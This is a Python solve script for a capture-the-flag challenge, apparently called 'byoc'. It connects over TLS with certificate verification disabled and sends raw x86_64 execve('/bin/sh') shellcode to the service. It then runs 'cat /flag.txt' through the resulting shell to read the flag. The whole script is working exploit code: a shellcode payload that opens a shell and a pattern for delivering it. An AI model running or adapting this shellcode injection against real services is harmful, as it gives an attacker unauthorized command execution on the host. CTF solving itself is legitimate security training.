import socket
import ssl
import time

def solve():
    host = 'byoc-8eebfba484ed.chall.nnsc.tf'
    port = 1337

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print("Connected!")
            
            # Read prompt "> "
            ssock.recv(1024)
            
            # x86_64 execve("/bin/sh")
            shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
            
            ssock.sendall(shellcode)
            
            time.sleep(1)
            
            # Try running cat /flag.txt
            ssock.sendall(b"cat /flag.txt\n")
            time.sleep(1)
            print("Flag:", ssock.recv(4096).decode(errors='replace'))

if __name__ == "__main__":
    solve()
